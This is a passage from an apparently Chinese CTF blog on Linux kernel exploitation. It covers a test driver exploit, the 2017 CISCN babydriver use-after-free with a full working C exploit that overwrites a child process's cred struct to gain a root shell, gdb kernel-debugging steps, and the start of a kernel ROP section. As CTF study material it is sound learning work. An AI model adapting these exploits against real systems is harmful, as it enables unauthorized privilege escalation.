class="number">6</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 创建dev_b</span></span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/test1&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open2&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (write(fd2, buf, <span class="number">0x8a</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;write2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(fd2, buf, <span class="number">0x8a</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;read2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x28</span>;i++)&#123;</span><br><span class="line">            buf[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(fd, buf, <span class="number">0x28</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">                        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调试流程记录"><a href="#调试流程记录" class="headerlink" title="调试流程记录"></a>调试流程记录</h3><p>要用root权限，在gdb中先<code>clear</code>，再<code>add-symbol-file test1.ko 0xffffffffc0000000 </code>，这个地址在给的系统中由lsmod获取这个test1.ko的基址，如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/ $ lsmod</span><br><span class="line">test1 2835 0 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure>

<p>加载后在gdb中执行<code>target remote:1234</code>即可连接上</p>
<p><strong>调试exp</strong></p>
<p>在加载过这个mod文件的gdb中可以直接断在test1_open()这样的函数名处，没有函数名就用地址来下断点（i b 可以查看已经下过的断点）</p>
<p>在gdb连接上后，对应的终端是不能执行信息的，需要在gdb中执行<code>c</code>，才能再回到终端中执行<code>./exp</code>，然后gdb就可以像用户态的题那样正常调试了（若可以附上源码，比如调试内核的时候可以在gdb中执行<code>layout split</code>看着会方便一些）</p>
<p>由ida可知test1_write()函数中的<code>copy_from_user(&amp;dest[used], buf, v5);</code>的基址是0x18a</p>
<h2 id="2017ciscn-babydriver"><a href="#2017ciscn-babydriver" class="headerlink" title="2017ciscn_babydriver"></a>2017ciscn_babydriver</h2><p>先解压 rootfs.cpio 看一下有什么文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:kernel_pwn/ $ <span class="built_in">mkdir</span> core   </span><br><span class="line">le0n:kernel_pwn/ $ <span class="built_in">ls</span></span><br><span class="line">babydriver.tar  boot.sh  bzImage  core  demo  rootfs.cpio</span><br><span class="line">le0n:kernel_pwn/ $ <span class="built_in">cd</span> core </span><br><span class="line">le0n:core/ $ <span class="built_in">mv</span> ../rootfs.cpio rootfs.cpio.gz </span><br><span class="line">le0n:core/ $ <span class="built_in">ls</span> </span><br><span class="line">rootfs.cpio.gz</span><br><span class="line">le0n:core/ $ gunzip rootfs.cpio.gz</span><br><span class="line">le0n:core/ $ <span class="built_in">ls</span></span><br><span class="line">rootfs.cpio</span><br><span class="line">le0n:core/ $ cpio -idmv &lt; rootfs.cpio</span><br><span class="line">.</span><br><span class="line">5556 blocks</span><br><span class="line">le0n:core/ $ <span class="built_in">ls</span>  </span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr</span><br><span class="line">le0n:core/ $ <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">chown</span> root:root flag</span><br><span class="line"><span class="built_in">chmod</span> 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/babydev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>根据 init 的内容，上面的30行加载了 <code>babydriver.ko</code> 这个驱动，根据 pwn 的一般套路，这个就是有漏洞的 LKM 了。init 的其他命令都是 linux 常用的命令，就不再解释了。</p>
<p>把这个驱动文件拿出来。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:core/ $ <span class="built_in">cp</span> ./lib/modules/4.4.72/babydriver.ko ..   </span><br><span class="line">le0n:core/ $ <span class="built_in">ls</span>              </span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr</span><br><span class="line">le0n:core/ $ <span class="built_in">cd</span> ../           </span><br><span class="line">le0n:kernel_pwn/ $ <span class="built_in">ls</span>               </span><br><span class="line">babydriver.ko  babydriver.tar  boot.sh  bzImage  core  demo</span><br><span class="line">le0n:kernel_pwn/ $ checksec babydriver.ko</span><br><span class="line">[*] Checking <span class="keyword">for</span> new versions of pwntools</span><br><span class="line">    To <span class="built_in">disable</span> this functionality, <span class="built_in">set</span> the contents of /home/le0n/.cache/.pwntools-cache-3.10/update to <span class="string">&#x27;never&#x27;</span> (old way).</span><br><span class="line">    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class="line">        [update]</span><br><span class="line">        interval=never</span><br><span class="line">[*] You have the latest version of Pwntools (5.0.0.dev0)</span><br><span class="line">[*] <span class="string">&#x27;/home/le0n/kernel_pwn/babydriver.ko&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x0)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>没有开 PIE，无 canary 保护，没有去除符号表。</p>
<p>用 IDA 打开分析，既然没有去除符号表，shift + F9 先看一下有什么结构体，可以发现如下的结构体：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br><span class="line">00000010</span><br></pre></td></tr></table></figure>

<p>再看一下主要函数（第一次做结合ai分析的）</p>
<p>babydriver_init 函数是这个内核模块（Kernel Module）的入口点。当你在终端中使用 insmod babydriver.ko 命令加载这个模块时，内核就会调用这个函数。</p>
<p>它的核心目的可以总结为一句话：<strong>创建一个名为 babydev 的字符设备（Character Device），并将其注册到系统中，以便用户空间的程序可以像读写文件一样与它进行交互。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">	<span class="comment">// 1. 分配设备号</span></span><br><span class="line">  <span class="keyword">if</span> ( alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="comment">/*alloc_chrdev_region: 这是第一步，向内核申请一个或多个设备号。</span></span><br><span class="line"><span class="comment">        &amp;babydev_no: 用来存放申请到的设备号（主设备号和次设备号）。</span></span><br><span class="line"><span class="comment">        0LL: 表示次设备号从 0 开始。</span></span><br><span class="line"><span class="comment">        1LL: 表示我们只申请 1 个设备。</span></span><br><span class="line"><span class="comment">        &quot;babydev&quot;: 设备的名字。</span></span><br><span class="line"><span class="comment">        作用: 在内核中注册一个唯一的“身份证号”，这样内核就知道有 babydev 这个东西了。如果成功，返回 0。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">  &#123;<span class="comment">// 2. 初始化字符设备结构体</span></span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops); </span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">      <span class="comment">// 3. 向内核注册字符设备</span></span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">      <span class="comment">//将初始化好的 cdev_0 正式添加到内核中，让它生效。</span></span><br><span class="line">      <span class="comment">//现在，内核知道当用户操作 babydev 这个设备号时，应该去调用 fops 里定义的那些函数。</span></span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;<span class="comment">// 4. 创建设备类和设备节点 (为了自动在 /dev/ 下创建文件)</span></span><br><span class="line">      v2 = _class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);      <span class="comment">// device_create 失败</span></span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);      <span class="comment">// class_create 失败</span></span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);        <span class="comment">// cdev_add 失败</span></span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;                 <span class="comment">// 返回错误码</span></span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);            <span class="comment">// alloc_chrdev_region 失败</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="全局状态"><a href="#全局状态" class="headerlink" title="全局状态"></a>全局状态</h3><p>首先，请注意全局变量 <code>babydev_struct</code>。所有的函数都围绕着这个<strong>唯一的、共享的</strong>结构体进行操作。这意味着它的状态（分配的缓冲区指针和长度）在不同的系统调用（<code>open</code>, <code>read</code>, <code>write</code>, <code>ioctl</code>, <code>close</code>）之间是<strong>持续存在的</strong>，并且是<strong>全局共享的</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_372)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br><span class="line">00000010</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="函数逐个分析（漏洞分析）"><a href="#函数逐个分析（漏洞分析）" class="headerlink" title="函数逐个分析（漏洞分析）"></a>函数逐个分析（漏洞分析）</h3><h4 id="1-babyopen-和-babyrelease-UAF-悬垂指针漏洞"><a href="#1-babyopen-和-babyrelease-UAF-悬垂指针漏洞" class="headerlink" title="1. babyopen 和 babyrelease (UAF &#x2F; 悬垂指针漏洞)"></a>1. <code>babyopen</code> 和 <code>babyrelease</code> (UAF &#x2F; 悬垂指针漏洞)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// babyopen: 分配内存</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(..., <span class="number">0x40L</span>L); <span class="comment">// 分配 64 字节</span></span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// babyrelease: 释放内存</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  kfree(babydev_struct.device_buf); <span class="comment">// 释放缓冲区</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>它们的作用：</strong></p>
<ul>
<li><code>babyopen</code> 在你执行 <code>open(&quot;/dev/babydev&quot;, ...)</code> 时被调用。它会分配一块 64 字节大小的内核内存，并将指针存放在 <code>babydev_struct.device_buf</code> 中。</li>
<li><code>babyrelease</code> 在你执行 <code>close()</code> 时被调用，它会释放这块内存。</li>
</ul>
</li>
<li><p><strong>漏洞：释放后重用 (Use-After-Free, UAF)</strong></p>
<ul>
<li>请仔细看 <code>babyrelease</code> 函数。在它调用 <code>kfree(babydev_struct.device_buf)</code> 之后，<strong>它没有将指针 <code>babydev_struct.device_buf</code> 设置为 NULL</strong>。</li>
<li><code>babydev_struct.device_buf</code> 现在包含了一个已经被释放的内存地址。这种指针被称为 <strong>“悬垂指针” (Dangling Pointer)</strong>。</li>
<li>如果在下一次调用 <code>open()</code> 重新分配内存之前，任何其他函数（如 <code>read</code> 或 <code>write</code>）尝试使用这个悬垂指针，它将访问一块已经被内核回收的内存，从而导致 <strong>UAF 漏洞</strong>。这是一个非常严重的漏洞。</li>
</ul>
</li>
</ul>
<h4 id="2-babywrite-和-babyioctl"><a href="#2-babywrite-和-babyioctl" class="headerlink" title="2. babywrite 和 babyioctl"></a>2. <code>babywrite</code> 和 <code>babyioctl</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// babyioctl: 重新分配缓冲区</span></span><br><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx // v4 是用户传入的 arg</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);            <span class="comment">// 释放旧缓冲区</span></span><br><span class="line">    babydev_struct.device_buf = _kmalloc(v4, ...); <span class="comment">// 分配一个用户控制大小(v4)的新缓冲区</span></span><br><span class="line">    babydev_struct.device_buf_len = v4;          <span class="comment">// 将长度更新为新大小</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// babywrite: 向缓冲区写入数据</span></span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx  // v4 是用户传入的 length</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 ) <span class="comment">// 检查: if (已分配大小 &gt; 用户要写入的长度)</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user(); <span class="comment">// 假设这里是 copy_from_user(device_buf, buffer, v4)</span></span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-2LL</span>; <span class="comment">// 出错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>它们的作用：</strong><ul>
<li><code>babyioctl</code> 是一个控制函数。如果你调用 <code>ioctl(fd, 0x10001, new_size)</code>，它会释放旧的缓冲区，并分配一个由你指定大小 (<code>new_size</code>) 的新缓冲区。</li>
<li><code>babywrite</code> 应该从你的用户态程序拷贝数据到内核缓冲区。</li>
</ul>
</li>
</ul>
<h4 id="3-babyread"><a href="#3-babyread" class="headerlink" title="3. babyread"></a>3. <code>babyread</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用思路（提权策略）"><a href="#利用思路（提权策略）" class="headerlink" title="利用思路（提权策略）"></a>利用思路（提权策略）</h3><ol>
<li>打开两次设备，通过ioctl将babydev_struct.device_buf大小变为的cred结构体的大小</li>
<li>释放第一个设备，fork出一个新的进程，这个进程的cred结构体就会放在babydev_struct.device_buf所指向的内存区域</li>
<li>使用第二个描述符，调用write向此时的babydev_struct.device_buf中写入28个0，刚好覆盖至uid和gid，实现root提权</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// O_RDWR 是在 fcntl.h 中定义的，你的代码是正确的</span></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl 的原型在 sys/ioctl.h 中定义</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123; <span class="comment">// 子进程</span></span><br><span class="line">        <span class="type">char</span> buf[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        write(fd2, buf, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root.\033[0m\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root.\033[0m\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// 父进程</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写好exp过后，由于rootfs.cpio里并没有libc，所以编译的时候要使用静态编译，利用musl-gcc可以使文件占的内存更小。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">musl-gcc ./exp.c -o exp --static</span><br></pre></td></tr></table></figure>


<p>编译好文件后重新打包文件系统</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>

<p>然后把boot.sh中的-initrd rootfs.cpio 改为-initrd rootfs.img</p>
<p>然后运行boot.sh后，执行我们的exp</p>
<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>先进入root模式在调试，之前已经分离出了<code>vmlinux</code></p>
<ol>
<li>启动gdb</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb -vmlinux -q</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>导入驱动</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">add-symbol-file ./babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>

<p>这个地址可在给的系统中执行<code>lsmod</code>查看</p>
<ol start="3">
<li>gdb远程连接</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">target remote:1234</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250730113539995.png" alt="image-20250730113539995"></p>
<p>接着就可以下断点（分别在babyopen、babyioctl、babywrite三处下断点），然后按c继续执行，再在qemu虚拟机中运行exp进行正常调试。<br><img data-src="/../images/image-20250730113730767.png" alt="image-20250730113730767"></p>
<p><strong>第一次在babyopen断下</strong></p>
<p>注意在进行kernel的调试时<code>尽量使用si步入</code>，在遇到<strong>call这类函数时可以使用<code>ni</code>进行步过</strong>.</p>
<p>si逐条单步步过汇编代码，直到为babydev_struct赋值的语句</p>
<p><img data-src="/../images/image-20250730113948274.png" alt="image-20250730113948274"></p>
<p>0xffffffffc00024d0为babydev_struct.dev_buf的地址.<br>0xffffffffc00024d8为babydev_struct.dev_buf_len的地址</p>
<p>赋值前0xffffffffc00024d0和0xffffffffc00024d8值为空。执行完两条赋值语句后，内容如下：</p>
<p><img data-src="/../images/image-20250730114315415.png" alt="image-20250730114315415"></p>
<p><strong>第二次babyopen断下</strong></p>
<p>运行到这两条赋值语句后，可以看到babydev_struct地址仍然是<code>0xffffffffc00024d0</code>（因为它是bss段的全局变量嘛）。</p>
<p><img data-src="/../images/image-20250730114410595.png" alt="image-20250730114410595"></p>
<p><strong>第二个断点babyioctl</strong></p>
<p>c一下就到了第二个断点，在qemu模拟的系统中可以看到我们已经成功打开了两个dev</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line">[  146.276097] device open</span><br><span class="line">[  146.285364] device open</span><br></pre></td></tr></table></figure>

<p>依旧是<code>si</code>到两个赋值语句处（0xb5、0xbc）</p>
<p>再次查看<code>0x~24b0</code>处结果如下：</p>
<p><img data-src="/../images/image-20250730115034907.png" alt="image-20250730115034907"></p>
<p><strong>第三个断点babywrite</strong></p>
<p>此时fork函数执行结束，子进程的<code>cred结构体被放入babydev_struct.dev_buf</code>指向的区域(就是ioctl中分配的哪个地址)，这时cred结构体的内容如下（0x3e8&#x3D;1000）：</p>
<p><img data-src="/../images/image-20250730115600288.png" alt="image-20250730115600288"></p>
<p>此时进入babywrite()的部分，我们在用户空间布置好一片空间为0，通过write()中copy_from_usr()即可通过写fd2的buf来改写cred结构体（在exp中写28个字节是因为这28个字节刚好可以覆盖uid,gid，并没有覆盖groups即id可以看到的第三个变量，在最后提权成功后可以有对比性的看出）</p>
<p>然后si执行到返回处。</p>
<p><img data-src="/../images/image-20250730115953087.png" alt="image-20250730115953087"></p>
<p>此时再查看cred结构体（也就是0x~b64e40处那块内存），即可发现uid和gid都为0</p>
<p><img data-src="/../images/image-20250730120119769.png" alt="image-20250730120119769"></p>
<p>可以看到前28个字节的内容都被改成了0；提权成功。</p>
<p><img data-src="/../images/image-20250730120203069.png" alt="image-20250730120203069"></p>
<h2 id="qwb2018-core"><a href="#qwb2018-core" class="headerlink" title="qwb2018-core"></a>qwb2018-core</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>题目可以从ctf-wiki上下载</p>
<p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p>
<p><strong>状态保存</strong></p>
<p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p>
<p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p>
<blockquote>
<p>算是一个通用的 pwn 板子。</p>
